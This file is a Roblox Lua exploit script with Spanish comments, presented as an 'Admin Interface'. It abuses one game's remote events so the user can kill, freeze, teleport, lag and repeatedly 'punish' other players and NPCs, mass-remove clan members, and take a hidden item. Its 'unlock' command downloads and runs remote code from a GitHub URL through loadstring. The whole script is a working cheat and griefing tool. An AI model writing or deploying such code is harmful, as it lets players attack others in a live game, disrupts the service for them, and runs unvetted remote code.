-- Admin Interface completo final
-- Incluye: cache de NPCs, autocompletado animado, botones scrollables, navegación con teclado, y T objetive arreglado.

-- Servicios
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

-- Estado
local punishBlacklist = {} -- userId -> true

-------------------------------------------------------------------
-- UI (ScreenGui) - tamaño/estética final
-------------------------------------------------------------------
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.Name = "AdminInterfaceGui"

local mainSize = UDim2.new(0, 200, 0, 300)
local minimizedSize = UDim2.new(0, 200, 0, 20)
local MainFrame = Instance.new("Frame")
MainFrame.Size = mainSize
MainFrame.Position = UDim2.new(0.5, -100, 0.25, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BackgroundTransparency = 0.2
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

local uiGradientMain = Instance.new("UIGradient", MainFrame)
uiGradientMain.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(25,25,25)), ColorSequenceKeypoint.new(1, Color3.fromRGB(10,10,10)) })
uiGradientMain.Rotation = 45

local UICorner = Instance.new("UICorner", MainFrame)
UICorner.CornerRadius = UDim.new(0, 12)

local Header = Instance.new("Frame", MainFrame)
Header.Name = "Header"
Header.Size = UDim2.new(1, 0, 0, 24)
Header.Position = UDim2.new(0, 0, 0, 0)
Header.BackgroundTransparency = 1

local TitleLabel = Instance.new("TextLabel", Header)
TitleLabel.Size = UDim2.new(0.8, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 8, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Admin Interface"
TitleLabel.TextColor3 = Color3.fromRGB(255,255,255)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.GothamSemibold

local MinimizeButton = Instance.new("TextButton", Header)
MinimizeButton.Size = UDim2.new(0.2, -8, 1, 0)
MinimizeButton.Position = UDim2.new(0.8, 0, 0, 0)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
MinimizeButton.Text = "–"
MinimizeButton.TextColor3 = Color3.fromRGB(0,0,0)
MinimizeButton.TextScaled = true
MinimizeButton.Font = Enum.Font.GothamSemibold

local ContentFrame = Instance.new("Frame", MainFrame)
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 1, -24)
ContentFrame.Position = UDim2.new(0, 0, 0, 24)
ContentFrame.BackgroundTransparency = 1

-- layout sizes
local inputHeight = 28
local suggestionsHeight = 140
local padding = 6

-- InputBox
local InputFrame = Instance.new("Frame", ContentFrame)
InputFrame.Name = "InputFrame"
InputFrame.Size = UDim2.new(1, 0, 0, inputHeight)
InputFrame.Position = UDim2.new(0, 0, 0, 0)
InputFrame.BackgroundTransparency = 1

local InputBox = Instance.new("TextBox", InputFrame)
InputBox.Size = UDim2.new(0.92, 0, 0, inputHeight - 8)
InputBox.Position = UDim2.new(0.04, 0, 0.18, 0)
InputBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
InputBox.TextColor3 = Color3.fromRGB(0,255,0)
InputBox.PlaceholderText = "Escribe jugador o NPC..."
InputBox.ClearTextOnFocus = true
InputBox.Font = Enum.Font.Gotham

local InputCorner = Instance.new("UICorner", InputBox)
InputCorner.CornerRadius = UDim.new(0,10)
local uiGradientInput = Instance.new("UIGradient", InputBox)
uiGradientInput.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(35,35,35)), ColorSequenceKeypoint.new(1, Color3.fromRGB(25,25,25)) })
uiGradientInput.Rotation = 45

-- Suggestions area
local SuggestionsFrame = Instance.new("Frame", ContentFrame)
SuggestionsFrame.Name = "SuggestionsFrame"
SuggestionsFrame.Size = UDim2.new(0.92, 0, 0, suggestionsHeight)
SuggestionsFrame.Position = UDim2.new(0.04, 0, 0, inputHeight + 4)
SuggestionsFrame.BackgroundTransparency = 1
SuggestionsFrame.Visible = false

local SuggestionsList = Instance.new("ScrollingFrame", SuggestionsFrame)
SuggestionsList.Size = UDim2.new(1, 0, 1, 0)
SuggestionsList.CanvasSize = UDim2.new(0,0,0,0)
SuggestionsList.ScrollBarThickness = 6
SuggestionsList.BackgroundTransparency = 1
SuggestionsList.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
local uiListLayout = Instance.new("UIListLayout", SuggestionsList)
uiListLayout.Padding = UDim.new(0,6)

-- ButtonsFrame scrollable
local ButtonsFrame = Instance.new("ScrollingFrame", ContentFrame)
ButtonsFrame.Name = "ButtonsFrame"
ButtonsFrame.Position = UDim2.new(0, 0, 0, inputHeight + 4 + suggestionsHeight + padding)
ButtonsFrame.Size = UDim2.new(1, 0, 1, -(inputHeight + 4 + suggestionsHeight + padding))
ButtonsFrame.BackgroundTransparency = 0.15
ButtonsFrame.BackgroundColor3 = Color3.fromRGB(15,15,15)
ButtonsFrame.ScrollBarThickness = 6
ButtonsFrame.CanvasSize = UDim2.new(0,0,0,0)
ButtonsFrame.ClipsDescendants = true

local grid = Instance.new("UIGridLayout", ButtonsFrame)
grid.CellSize = UDim2.new(0, 90, 0, 28)
grid.CellPadding = UDim2.new(0, 6, 0, 6)
grid.FillDirectionMaxCells = 2
grid.SortOrder = Enum.SortOrder.LayoutOrder
grid.HorizontalAlignment = Enum.HorizontalAlignment.Center

grid:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	local sizeY = grid.AbsoluteContentSize.Y
	ButtonsFrame.CanvasSize = UDim2.new(0, 0, 0, sizeY + 12)
end)

-------------------------------------------------------------------
-- Drag & minimize
-------------------------------------------------------------------
local isMinimized = false
MinimizeButton.MouseButton1Click:Connect(function()
	isMinimized = not isMinimized
	local tweenSize = TweenService:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = isMinimized and minimizedSize or mainSize })
	tweenSize:Play()
	ContentFrame.Visible = not isMinimized
	pcall(function() MinimizeButton.Text = isMinimized and "+" or "–" end)
end)

local Dragging, DragInput, DragStart, StartPos
Header.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
		Dragging = true
		DragStart = input.Position
		StartPos = MainFrame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				Dragging = false
			end
		end)
	end
end)
Header.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement then
		DragInput = input
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == DragInput and Dragging then
		local Delta = input.Position - DragStart
		if input.UserInputType == Enum.UserInputType.Touch then
			local newXOffset = StartPos.X.Offset + Delta.X
			local newYOffset = StartPos.Y.Offset + Delta.Y
			MainFrame.Position = UDim2.new(StartPos.X.Scale, newXOffset, StartPos.Y.Scale, newYOffset)
		else
			local screenSize = workspace.CurrentCamera.ViewportSize
			local newXOffset = math.clamp(StartPos.X.Offset + Delta.X, 0, screenSize.X - MainFrame.Size.X.Offset)
			local newYOffset = math.clamp(StartPos.Y.Offset + Delta.Y, 0, screenSize.Y - MainFrame.Size.Y.Offset)
			MainFrame.Position = UDim2.new(StartPos.X.Scale, newXOffset, StartPos.Y.Scale, newYOffset)
		end
	end
end)

-------------------------------------------------------------------
-- Utilitarios: detectar Character de Player
-------------------------------------------------------------------
local function isPlayerCharacter(model)
	for _, p in ipairs(Players:GetPlayers()) do
		if p.Character == model then return true end
	end
	return false
end

-------------------------------------------------------------------
-- Cache de NPCs (rápido)
-------------------------------------------------------------------
local npcCache = {}
local function addNPCToCache(model)
	if not model or not model:IsA("Model") then return end
	if isPlayerCharacter(model) then return end
	local humanoid = model:FindFirstChildOfClass("Humanoid") or model:FindFirstChild("Humanoid")
	if not humanoid then return end
	npcCache[model] = true
end
local function removeNPCFromCache(model)
	if not model or not model:IsA("Model") then return end
	npcCache[model] = nil
end

-- init cache
for _, inst in ipairs(Workspace:GetDescendants()) do
	if inst:IsA("Humanoid") then
		local m = inst.Parent
		if m and m:IsA("Model") and not isPlayerCharacter(m) then npcCache[m] = true end
	end
end
Workspace.DescendantAdded:Connect(function(desc)
	if desc:IsA("Humanoid") then
		local m = desc.Parent
		if m and m:IsA("Model") then addNPCToCache(m) end
	elseif desc:IsA("Model") and desc:FindFirstChildOfClass("Humanoid") then
		addNPCToCache(desc)
	end
end)
Workspace.DescendantRemoving:Connect(function(desc)
	if desc:IsA("Humanoid") then
		local m = desc.Parent
		if m and m:IsA("Model") then removeNPCFromCache(m) end
	elseif desc:IsA("Model") then removeNPCFromCache(desc) end
end)
local function getAllNPCs()
	local out = {}
	for model,_ in pairs(npcCache) do
		if model and model.Parent then table.insert(out, model) else npcCache[model] = nil end
	end
	return out
end

-------------------------------------------------------------------
-- Autocompletado animado + debounce + navegación
-------------------------------------------------------------------
local suggestionDebounced = false
local lastPendingText = nil
local suggestionButtons = {}
local selectedIndex = 0

local function clearSuggestions()
	for _, child in ipairs(SuggestionsList:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then child:Destroy() end
	end
	suggestionButtons = {}
	SuggestionsList.CanvasSize = UDim2.new(0,0,0,0)
	selectedIndex = 0
end

local function setSelectedIndex(idx)
	for i, btn in ipairs(suggestionButtons) do
		if btn and btn:IsA("TextButton") then
			TweenService:Create(btn, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(30,30,30)}):Play()
			btn.TextColor3 = Color3.fromRGB(255,255,255)
		end
	end
	selectedIndex = idx
	local btn = suggestionButtons[selectedIndex]
	if btn and btn:IsA("TextButton") then
		TweenService:Create(btn, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(80,80,80)}):Play()
		btn.TextColor3 = Color3.fromRGB(0,255,0)
		pcall(function() SuggestionsList.CanvasPosition = Vector2.new(0, math.max(0, (selectedIndex-1) * (btn.AbsoluteSize.Y + 6) - 22)) end)
	end
end

local function addSuggestionText(text)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, 0, 0, 28)
	btn.BackgroundTransparency = 1
	btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
	btn.TextColor3 = Color3.fromRGB(255,255,255)
	btn.TextScaled = false
	btn.Font = Enum.Font.Gotham
	btn.Text = text
	btn.AutoButtonColor = false
	btn.Parent = SuggestionsList
	btn.ClipsDescendants = true

	local corner = Instance.new("UICorner", btn); corner.CornerRadius = UDim.new(0,10)
	local stroke = Instance.new("UIStroke", btn); stroke.Thickness = 1; stroke.Color = Color3.fromRGB(45,45,45); stroke.Transparency = 0.45

	btn.BackgroundTransparency = 1
	btn.TextTransparency = 1
	task.delay(0.01, function()
		pcall(function()
			TweenService:Create(btn, TweenInfo.new(0.14, Enum.EasingStyle.Quad), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
		end)
	end)

	local originalSize = btn.Size
	local hoverSize = UDim2.new(1, 6, 0, 32)
	btn.MouseEnter:Connect(function()
		pcall(function()
			TweenService:Create(btn, TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = hoverSize}):Play()
			TweenService:Create(btn, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(70,70,70)}):Play()
		end)
	end)
	btn.MouseLeave:Connect(function()
		pcall(function()
			TweenService:Create(btn, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {Size = originalSize}):Play()
			TweenService:Create(btn, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(30,30,30)}):Play()
		end)
	end)

	btn.MouseButton1Click:Connect(function()
		InputBox.Text = text
		SuggestionsFrame.Visible = false
		clearSuggestions()
	end)

	table.insert(suggestionButtons, btn)
end

local function collectAutocompleteItems()
	local items = {}
	table.insert(items, "all") table.insert(items, "others") table.insert(items, "me")
	table.insert(items, "npcs") table.insert(items, "allnpcs")
	for _, p in ipairs(Players:GetPlayers()) do
		table.insert(items, p.Name or "")
		table.insert(items, p.DisplayName or "")
	end
	for _, npc in ipairs(getAllNPCs()) do
		table.insert(items, npc.Name or "")
	end
	return items
end

local function updateSuggestionsImmediate(text)
	clearSuggestions()
	if not text or text == "" then SuggestionsFrame.Visible = false return end
	local lower = string.lower(text)
	local added = 0
	local items = collectAutocompleteItems()
	for _, item in ipairs(items) do
		if type(item) == "string" and string.lower(item):find(lower) then
			addSuggestionText(item)
			added = added + 1
			if added >= 10 then break end
		end
	end
	if added > 0 then
		SuggestionsFrame.Visible = true
		local totalHeight = (#suggestionButtons) * 34
		SuggestionsList.CanvasSize = UDim2.new(0, 0, 0, totalHeight)
		setSelectedIndex(1)
	else
		SuggestionsFrame.Visible = false
	end
end

function scheduleSuggestionsUpdate()
	if suggestionDebounced then
		lastPendingText = InputBox.Text or ""
		return
	end
	suggestionDebounced = true
	lastPendingText = InputBox.Text or ""
	task.delay(0.08, function()
		updateSuggestionsImmediate(lastPendingText)
		suggestionDebounced = false
	end)
end

InputBox:GetPropertyChangedSignal("Text"):Connect(function()
	lastPendingText = InputBox.Text or ""
	if not suggestionDebounced then scheduleSuggestionsUpdate() end
end)
Players.PlayerAdded:Connect(function() scheduleSuggestionsUpdate() end)
Players.PlayerRemoving:Connect(function() scheduleSuggestionsUpdate() end)

-- Click fuera: cerrar sugerencias si visible (simple)
UserInputService.InputBegan:Connect(function(input, processed)
	if processed then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 and SuggestionsFrame.Visible then
		task.delay(0.05, function()
			if SuggestionsFrame.Visible then
				SuggestionsFrame.Visible = false
				clearSuggestions()
			end
		end)
	end
end)

-------------------------------------------------------------------
-- Particle effect
-------------------------------------------------------------------
local function spawnParticleEffect(button)
	for i = 1, 4 do
		local particle = Instance.new("ImageLabel")
		particle.Size = UDim2.new(0,6,0,6)
		particle.Position = UDim2.new(0.5,0,0.5,0)
		particle.AnchorPoint = Vector2.new(0.5,0.5)
		particle.BackgroundTransparency = 1
		particle.Image = "rbxassetid://2795790"
		particle.ImageColor3 = Color3.new(math.random(), math.random(), math.random())
		particle.Parent = button
		local randomOffset = UDim2.new(0, math.random(-18,18), 0, math.random(-18,18))
		local tweenInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(particle, tweenInfo, { Position = randomOffset, ImageTransparency = 0 })
		tween:Play()
		tween.Completed:Connect(function() particle:Destroy() end)
	end
end

-------------------------------------------------------------------
-- Targets resolution (players + NPCs)
-------------------------------------------------------------------
local function getTargets(targetText)
	local lowerTarget = string.lower(targetText or "")
	local results = {}
	if lowerTarget == "all" then
		for _, p in ipairs(Players:GetPlayers()) do table.insert(results, p) end
		for _, npc in ipairs(getAllNPCs()) do table.insert(results, npc) end
		return results
	elseif lowerTarget == "allnpcs" or lowerTarget == "npcs" then
		for _, npc in ipairs(getAllNPCs()) do table.insert(results, npc) end
		return results
	elseif lowerTarget == "others" then
		for _, p in ipairs(Players:GetPlayers()) do if p ~= LocalPlayer then table.insert(results, p) end end
		return results
	elseif lowerTarget == "me" then
		return { LocalPlayer }
	end

	for _, player in ipairs(Players:GetPlayers()) do
		local nameLower = string.lower(player.Name or "")
		local displayLower = string.lower(player.DisplayName or "")
		if nameLower == lowerTarget or displayLower == lowerTarget or nameLower:find(lowerTarget) or displayLower:find(lowerTarget) then
			table.insert(results, player)
		end
	end
	for _, npc in ipairs(getAllNPCs()) do
		local nm = string.lower(npc.Name or "")
		if nm == lowerTarget or nm:find(lowerTarget) then table.insert(results, npc) end
	end
	return results
end

-------------------------------------------------------------------
-- Ejecutar comandos (incluye T objetive arreglado)
-------------------------------------------------------------------
local function executeCommand(command)
	local targetText = InputBox.Text
	local targets = getTargets(targetText)
	if #targets == 0 then
		StarterGui:SetCore("SendNotification", { Title = "Admin", Text = "Objetivo no encontrado.", Duration = 1 })
		return
	end

	for _, t in ipairs(targets) do
		local char = nil
		local isPlayer = false
		local userId = nil

		if typeof(t) == "Instance" then
			if t:IsA("Player") then
				isPlayer = true
				userId = t.UserId
				char = t.Character
			elseif t:IsA("Model") then
				char = t
			end
		else
			if t.Character then char = t.Character end
		end

		local hasHumanoid = char and (char:FindFirstChildOfClass("Humanoid") or char:FindFirstChild("Humanoid"))
		local primary = char and (char:FindFirstChild("PrimaryPart") or char:FindFirstChild("HumanoidRootPart"))

		-- comandos
		if command == "bring" then
			if char and primary and LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
				local ok, moves = pcall(function() return ReplicatedStorage:FindFirstChild("_BindableEvents") and ReplicatedStorage._BindableEvents:FindFirstChild("Moves") and ReplicatedStorage._BindableEvents.Moves end)
				if ok and moves and moves:FindFirstChild("StopEnemy") then
					pcall(function()
						ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(true, char, LocalPlayer.Character.PrimaryPart.CFrame)
						ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(false, char)
					end)
				end
			end

		elseif command == "kill" then
			if hasHumanoid then
				local humanoid = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChild("Humanoid")
				if humanoid then
					pcall(function()
						if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.TakeDamage then
							ReplicatedStorage._BindableEvents.Moves.TakeDamage:FireServer(humanoid, 1e111, LocalPlayer)
						end
					end)
				end
			end

		elseif command == "heal" then
			if hasHumanoid then
				local humanoid = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChild("Humanoid")
				if humanoid then
					pcall(function()
						if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.TakeDamage then
							ReplicatedStorage._BindableEvents.Moves.TakeDamage:FireServer(humanoid, -1e9, LocalPlayer)
						end
					end)
				end
			end

		elseif command == "punish" then
			if isPlayer and userId and char then
				if not punishBlacklist[userId] then
					punishBlacklist[userId] = true
					spawn(function()
						while punishBlacklist[userId] and char.Parent do
							pcall(function()
								if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.StopEnemy then
									ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(true, char, CFrame.new(math.huge, math.huge, math.huge))
								end
							end)
							wait(0.12)
						end
					end)
				end
			else
				StarterGui:SetCore("SendNotification", { Title="Admin", Text="punish solo válido para jugadores.", Duration=1 })
			end

		elseif command == "unpunish" then
			if isPlayer and userId and punishBlacklist[userId] then
				punishBlacklist[userId] = nil
				if char and LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
					pcall(function()
						if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.StopEnemy then
							ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(true, char, LocalPlayer.Character.PrimaryPart.CFrame)
							ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(false, char)
						end
					end)
				end
			end

		elseif command == "freeze" then
			if char and primary then
				pcall(function()
					if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.StopEnemy then
						ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(true, char, primary.CFrame)
					end
				end)
			end

		elseif command == "unfreeze" then
			if char then
				pcall(function()
					if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.StopEnemy then
						ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(false, char)
					end
				end)
			end

		elseif command == "to" then
			if primary and LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
				pcall(function() LocalPlayer.Character:SetPrimaryPartCFrame(primary.CFrame) end)
			end

		elseif command == "b1" then
			pcall(function()
				local object = workspace.Map.DBS.DB.DB1
				if object and char and ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.StopEnemy then
					ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(true, char, object.CFrame)
					ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(false, char)
				end
			end)

		elseif command == "hk" then
			pcall(function()
				local hakaiItem = game:GetService("TestService"):FindFirstChild("Hakai")
				if hakaiItem then
					local hakaiClone = hakaiItem:Clone()
					hakaiClone.Parent = LocalPlayer.Backpack
				end
			end)

		elseif command == "unlock" then
			pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Troll-Hub/LonelySC/refs/heads/main/Unlocker%201.0"))() end)

		elseif command == "Force Lag" then
			if char and primary then
				pcall(function()
					if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.BreakStorm then
						ReplicatedStorage._BindableEvents.Moves.BreakStorm:FireServer(true, LocalPlayer.Character, primary.Position, char)
					end
				end)
			else
				StarterGui:SetCore("SendNotification", { Title = "Admin", Text = "El objetivo no tiene personaje válido.", Duration = 1 })
			end

		elseif command == "permGod" then
			if hasHumanoid then
				local humanoid = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChild("Humanoid")
				if humanoid then
					pcall(function()
						if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.TakeDamage then
							ReplicatedStorage._BindableEvents.Moves.TakeDamage:FireServer(humanoid, -1e111, LocalPlayer)
							ReplicatedStorage._BindableEvents.Moves.TakeDamage:FireServer(humanoid, 1e111, LocalPlayer)
						end
					end)
				end
			end

		elseif command == "Killer" then
			if char then
				if isPlayer and userId then punishBlacklist[userId] = true end
				pcall(function()
					if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.StopEnemy then
						ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(true, char, CFrame.new(math.huge, math.huge, math.huge))
						ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(false, char)
					end
				end)
			end

		elseif command == "noclans" then
			pcall(function()
				local playerLocal = LocalPlayer
				local Remote = ReplicatedStorage:WaitForChild("SS_Comunication"):WaitForChild("RemoveMember")
				local fixedString = "5yv260y391"
				local hereFolder = playerLocal.PlayerGui:WaitForChild("PlayerInterface")
					:WaitForChild("Menu")
					:WaitForChild("Clans")
					:WaitForChild("Info")
					:WaitForChild("Clan")
					:WaitForChild("Players")
					:WaitForChild("Here")
				for _, child in pairs(hereFolder:GetChildren()) do
					local idValue = child.Name
					local args = {[1] = fixedString, [2] = idValue}
					Remote:FireServer(unpack(args))
					task.wait(0.05)
				end
			end)

		elseif command == "T objetive" then
			-- Arreglado: aplica a players y NPCs por igual (usa 'targets' calculado antes)
			local alreadyExecuted = {}
			local function runForTarget(p)
				if alreadyExecuted[p] then return end
				alreadyExecuted[p] = true

				local targetChar = nil
				if typeof(p) == "Instance" and p:IsA("Player") then
					targetChar = p.Character
				elseif typeof(p) == "Instance" and p:IsA("Model") then
					targetChar = p
				end

				if targetChar and targetChar:FindFirstChildOfClass("Humanoid") then
					local humanoid = targetChar:FindFirstChildOfClass("Humanoid") or targetChar:FindFirstChild("Humanoid")
					local args = {
						[1] = {
							["Humanoid"] = humanoid,
							["Head"] = targetChar:FindFirstChild("Head"),
							["UpperTorso"] = targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso"),
							["HumanoidRootPart"] = targetChar:FindFirstChild("HumanoidRootPart"),
							["Character"] = targetChar
						},
						[2] = (LocalPlayer.Status and LocalPlayer.Status.Mode) or nil,
						[3] = (targetChar.Status and targetChar.Status.ModeActive) or nil,
						[4] = targetChar.Status,
						[5] = false
					}
					pcall(function()
						if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Transform then
							ReplicatedStorage._BindableEvents.Transform:InvokeServer(unpack(args))
						end
					end)
				end
			end

			-- ejecuta para cada objetivo resuelto
			for _, p in ipairs(targets) do runForTarget(p) end
		end
	end

	StarterGui:SetCore("SendNotification", { Title="Admin", Text="Comando ejecutado: "..string.upper(command), Duration=0.6 })
end

-------------------------------------------------------------------
-- Reaplicar punish a jugadores en blacklist al unirse
-------------------------------------------------------------------
Players.PlayerAdded:Connect(function(player)
	if punishBlacklist[player.UserId] then
		player.CharacterAdded:Connect(function(character)
			spawn(function()
				while player.Parent and punishBlacklist[player.UserId] do
					pcall(function()
						if ReplicatedStorage._BindableEvents and ReplicatedStorage._BindableEvents.Moves and ReplicatedStorage._BindableEvents.Moves.StopEnemy then
							ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(true, character, CFrame.new(math.huge, math.huge, math.huge))
						end
					end)
					wait(0.12)
				end
			end)
		end)
	end
end)

-------------------------------------------------------------------
-- Botones de comando (estética mejorada)
-------------------------------------------------------------------
local function createCommandButtons()
	local commands = {"kill", "heal", "Killer", "permGod", "punish", "unpunish", "freeze", "unfreeze", "bring", "to", "b1", "hk", "unlock", "noclans", "Force Lag", "T objetive"}
	for _, cmd in ipairs(commands) do
		local button = Instance.new("TextButton")
		button.Size = UDim2.new(1, 0, 0, 28)
		button.BackgroundColor3 = Color3.fromRGB(235,235,235)
		button.TextColor3 = Color3.fromRGB(20,20,20)
		button.TextScaled = true
		button.Text = string.upper(cmd)
		button.Font = Enum.Font.Gotham
		button.AutoButtonColor = false
		button.Parent = ButtonsFrame

		local corner = Instance.new("UICorner", button); corner.CornerRadius = UDim.new(0,10)
		local stroke = Instance.new("UIStroke", button); stroke.Thickness = 1; stroke.Color = Color3.fromRGB(200,200,200); stroke.Transparency = 0.8

		local original = button.Size
		local hoverSize = UDim2.new(1, 8, 0, 32)
		button.MouseEnter:Connect(function()
			pcall(function()
				TweenService:Create(button, TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = hoverSize}):Play()
				TweenService:Create(button, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(200,200,200)}):Play()
			end)
		end)
		button.MouseLeave:Connect(function()
			pcall(function()
				TweenService:Create(button, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {Size = original}):Play()
				TweenService:Create(button, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(235,235,235)}):Play()
			end)
		end)

		button.MouseButton1Click:Connect(function()
			spawnParticleEffect(button)
			executeCommand(cmd)
		end)
	end
end
createCommandButtons()

-------------------------------------------------------------------
-- Navegación teclado para autocompletado: flechas arriba/abajo, Enter/Esc
-------------------------------------------------------------------
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
	if SuggestionsFrame.Visible then
		if input.KeyCode == Enum.KeyCode.Down then
			if #suggestionButtons > 0 then
				local nextIdx = selectedIndex + 1
				if nextIdx > #suggestionButtons then nextIdx = 1 end
				setSelectedIndex(nextIdx)
			end
		elseif input.KeyCode == Enum.KeyCode.Up then
			if #suggestionButtons > 0 then
				local prevIdx = selectedIndex - 1
				if prevIdx < 1 then prevIdx = #suggestionButtons end
				setSelectedIndex(prevIdx)
			end
		elseif input.KeyCode == Enum.KeyCode.Return or input.KeyCode == Enum.KeyCode.KeypadEnter then
			if SuggestionsFrame.Visible and selectedIndex >= 1 and suggestionButtons[selectedIndex] then
				local chosen = suggestionButtons[selectedIndex]
				if chosen and chosen.Text then
					InputBox.Text = chosen.Text
					SuggestionsFrame.Visible = false
					clearSuggestions()
				end
			end
		elseif input.KeyCode == Enum.KeyCode.Escape then
			SuggestionsFrame.Visible = false
			clearSuggestions()
		end
	end
end)

-- Enter on InputBox: apply first suggestion or notify
InputBox.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		if SuggestionsFrame.Visible and #suggestionButtons > 0 then
			InputBox.Text = suggestionButtons[1].Text
			SuggestionsFrame.Visible = false
			clearSuggestions()
			return
		end
		StarterGui:SetCore("SendNotification", { Title = "Admin", Text = "Pulsa un botón de comando para ejecutar.", Duration = 1 })
	end
end)

-- FIN
